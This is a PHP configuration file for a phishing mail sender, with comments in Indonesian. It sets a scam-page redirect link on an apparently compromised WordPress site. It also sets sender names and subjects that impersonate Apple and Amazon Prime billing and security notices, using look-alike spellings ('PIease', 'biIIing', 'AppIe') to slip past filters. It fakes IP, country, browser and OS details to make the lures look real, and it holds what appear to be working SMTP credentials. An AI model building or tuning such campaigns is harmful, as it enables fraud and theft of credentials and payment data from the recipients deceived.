<?php
require 'modules/FourKey/FourKey.php';
class Config
{
	function alias($data  , $email ){
		$this->modules = new FourKeyModules;
		$config = $this->setting();
		$data   = str_replace("{date}", date("F j, Y") , $data);
		$data 	= str_replace("{email}", $email , $data);
		$data 	= str_replace("{ip}", rand(10,999).".".rand(10,999).".".rand(10,999).".".rand(10,999) , $data);
		$data 	= str_replace("{short}", $config['scampage_link'], $data);
		$data 	= str_replace("{country}", $this->modules->country()[value] , $data);
		$data 	= str_replace("{browser}", $this->modules->browser()[value] , $data);
		$data 	= str_replace("{os}", $this->modules->os()[value] , $data);
		$data 	= $this->modules->check_random($data);
		return $data;
	}
	function setting(){
		return array(
			"mail_list"      	=> "email.txt",							// nama mailist
			'link' 	=> 'https://ap-imports.com/Backup/wp-admin/network/gik.php?https://www.google.com?{textnumrandom,5,1,up}', 									// url link
			'number' 			=> 1,  									// jumlah email yang di kirim
			'delay'  			=> 5, 									// delay setelah mengirim email yang di kirim
		);
	}
	function smtp()
	{
		/*	----------------------------------------------------------------
			- HARAP DI PERHATIKAN SAAT KONFIGURASI KARENA SENSIF.
			- ISILAH DATA DI DALAM KUTIP ATAU GANTI ... DENGAN DATA MU
			- Kesalahan Smtp Connect() karena kurang teliti atau memang smtp itu mati.
			----------------------------------------------------------------
		*/

		return array(

			/*------------- Konfigurasi SMTP -------------*/
			array(
				'smtp_user' 	=>  'noreply-appmailsendingwithspreadsheetgoogle89@froyonionxbnn.com',
				'smtp_pass' 	=>  'Root789@',
				'smtp_host' 	=>  'smtp.office365.com',
				'smtp_port' 	=>  '587', 	// 587 atau 465 [587 = tls | 465 = ssl]
				'smtp_secure' 	=>  'tls', 	// tls atau ssl
				'smtp_priority'	=>  '0', 	// 0 = normal, 1 = high, 5 = low  
				'recipients' 	=> array(
				/*
				textrandom
				numrandom */
					'from_name'  => 'iPhone Verification.',			// for yahoo => 'AppIe Store',
					'from_email' => 'noreply-appmailsendingwithspreadsheetgoogle89@froyonionxbnn.com',	 	// for yahoo => 'noreply@management-appserv.business',
				),
				'content' 	=> array(
					'format' => array(
	'Re: [Prime Membership Notification] PIease check your biIIing informations - {randnumletter,6,7,up} - {date}'/*'RE: [Report-reminder] Your Apple Account Has Been Locked For Security Reason.' */=> 'yori.html',  // hapus line ini bila tidak digunakan
					),
					'attachments'=> array(
						'test.pdf', //✉ masukan file attachments di folder attachments , jika tidak di perlukan silahkan rubah namanya menjadi test.pdf
					),
				),
			),
			/*--------------------------------------------*/

		);
	}

	public function letter_header(){
		return array(
			'subject' => 'Account-Activity #{textnumrandom,6,3,up}',
		);
	}
}
